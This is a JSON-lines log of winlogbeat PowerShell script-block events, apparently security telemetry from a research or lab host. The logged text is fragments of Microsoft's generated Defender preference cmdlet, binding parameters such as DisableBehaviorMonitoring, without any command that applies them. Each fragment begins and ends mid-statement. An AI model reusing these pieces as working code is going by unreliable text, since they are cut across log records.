$__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ThreatIDDefaultAction_Actions'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('AttackSurfaceReductionOnlyExclusions')) {\n          [object]$__cmdletization_value = ${AttackSurfaceReductionOnlyExclusions}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionOnlyExclusions'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionOnlyExclusions'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('ControlledFolderAccessAllowedApplications')) {\n          [object]$__cmdletization_value = ${ControlledFolderAccessAllowedApplications}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ControlledFolderAccessAllowedApplications'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ControlledFolderAccessAllowedApplications'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('ControlledFolderAccessProtectedFolders')) {\n          [object]$__cmdletization_value = ${ControlledFolderAccessProtectedFolders}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ControlledFolderAccessProtectedFolders'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ControlledFolderAccessProtectedFolders'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('AttackSurfaceReductionRules_Ids')) {\n          [object]$__cmdletization_value = ${AttackSurfaceReductionRules_Ids}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionRules_Ids'; ParameterType = 'System.String[]'; Bindings "}
{"timestamp":"2021-09-15T16:35:23","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:23","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Execute a Remote Command","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":"e; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ControlledFolderAccessAllowedApplications'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('ControlledFolderAccessProtectedFolders')) {\n          [object]$__cmdletization_value = ${ControlledFolderAccessProtectedFolders}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ControlledFolderAccessProtectedFolders'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ControlledFolderAccessProtectedFolders'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('AttackSurfaceReductionRules_Ids')) {\n          [object]$__cmdletization_value = ${AttackSurfaceReductionRules_Ids}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionRules_Ids'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionRules_Ids'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('AttackSurfaceReductionRules_Actions')) {\n          [object]$__cmdletization_value = ${AttackSurfaceReductionRules_Actions}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionRules_Actions'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ASRRuleActionType[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionRules_Actions'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ASRRuleActionType[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('EnableLowCpuPriority')) {\n          [object]$__cmdletization_value = ${EnableLowCpuPriority}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableLowCpuPriority'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableLowCpuPriority'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('EnableFileHashComputation')) {\n          [object]$__cmdletization_value = ${EnableFileHashComputation}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableFileHashComputation'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableFileHashComputation'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('EnableFullScanOnBatteryPower')) {\n          [object]$__cmdletization_value = ${EnableFullScanOnBatteryPower}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableFullScanOnBatteryPower'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableFullScanOnBatteryPower'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('ProxyPacUrl')) {\n          [object]$__cmdletization_value = ${ProxyPacUrl}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ProxyPacUrl'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ProxyPacUrl'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('ProxyServer')) {\n          [object]$__cmdletization_value = ${ProxyServer}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ProxyServer'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ProxyServer'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('ProxyBypass')) {\n          [object]$__cmdletization_value = ${ProxyBypass}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ProxyBypass'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ProxyBypass'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('ForceUseProxyOnly')) {\n          [object]$__cmdletization_value = ${ForceUseProxyOnly}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ForceUseProxyOnly'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ForceUseProxyOnly'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('DisableTlsParsing')) {\n          [object]$__cmdletization_value = ${DisableTlsParsing}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableTlsParsing'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableTlsParsing'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('DisableHttpParsing')) {\n          [object]$__cmdletization_value = ${DisableHttpParsing}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableHttpParsing'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableHttpParsing'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('DisableDnsParsing')) {\n          [object]$__cmdletization_value = ${DisableDnsParsing}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableDnsParsing'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableDnsParsing'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('DisableDnsOverTcpParsing')) {\n          [object]$__cmdletization_value = ${DisableDnsOverTcpParsing}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableDnsOverTcpParsing'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n   "}
{"timestamp":"2021-09-15T16:35:23","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:23","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Execute a Remote Command","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":"gnatureBlobFileSharesSources')) {\n          [object]$__cmdletization_value = ${SignatureBlobFileSharesSources}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureBlobFileSharesSources'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureBlobFileSharesSources'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('MeteredConnectionUpdates')) {\n          [object]$__cmdletization_value = ${MeteredConnectionUpdates}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'MeteredConnectionUpdates'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'MeteredConnectionUpdates'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('AllowNetworkProtectionOnWinServer')) {\n          [object]$__cmdletization_value = ${AllowNetworkProtectionOnWinServer}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AllowNetworkProtectionOnWinServer'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AllowNetworkProtectionOnWinServer'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('DisableDatagramProcessing')) {\n          [object]$__cmdletization_value = ${DisableDatagramProcessing}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableDatagramProcessing'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableDatagramProcessing'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('DisableCpuThrottleOnIdleScans')) {\n          [object]$__cmdletization_value = ${DisableCpuThrottleOnIdleScans}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableCpuThrottleOnIdleScans'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableCpuThrottleOnIdleScans'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('MAPSReporting')) {\n          [object]$__cmdletization_value = ${MAPSReporting}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'MAPSReporting'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.MAPSReportingType'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'MAPSReporting'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.MAPSReportingType'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('SubmitSamplesConsent')) {\n          [object]$__cmdletization_value = ${SubmitSamplesConsent}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SubmitSamplesConsent'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.SubmitSamplesConsentType'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SubmitSamplesConsent'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.SubmitSamplesConsentType'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('DisableAutoExclusions')) {\n          [object]$__cmdletization_value = ${DisableAutoExclusions}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableAutoExclusions'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableAutoExclusions'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('DisablePrivacyMode')) {\n          [object]$__cmdletization_value = ${DisablePrivacyMode}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisablePrivacyMode'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisablePrivacyMode'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('RandomizeScheduleTaskTimes')) {\n          [object]$__cmdletization_value = ${RandomizeScheduleTaskTimes}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RandomizeScheduleTaskTimes'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RandomizeScheduleTaskTimes'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('SchedulerRandomizationTime')) {\n          [object]$__cmdletization_value = ${SchedulerRandomizationTime}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SchedulerRandomizationTime'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SchedulerRandomizationTime'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('DisableBehaviorMonitoring')) {\n          [object]$__cmdletization_value = ${DisableBehaviorMonitoring}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableBehaviorMonitoring'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableBehaviorMonitoring'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('DisableIntrusionPreventionSystem')) {\n          [object]$__cmdletization_value = ${DisableIntrusionPreventionSystem}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableIntrusionPreventionSystem'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableIntrusionPreventionSystem'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('DisableIOAVProtection')) {\n          [object]$__cmdletization_value = ${DisableIOAVProtection}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableIOAVProtection'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableIOAVProtection'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n  "}
{"timestamp":"2021-09-15T16:35:23","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:23","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Execute a Remote Command","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":"     } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableDnsOverTcpParsing'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('DisableSshParsing')) {\n          [object]$__cmdletization_value = ${DisableSshParsing}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableSshParsing'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableSshParsing'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('PlatformUpdatesChannel')) {\n          [object]$__cmdletization_value = ${PlatformUpdatesChannel}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'PlatformUpdatesChannel'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.UpdatesChannelType'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'PlatformUpdatesChannel'; ParameterType = 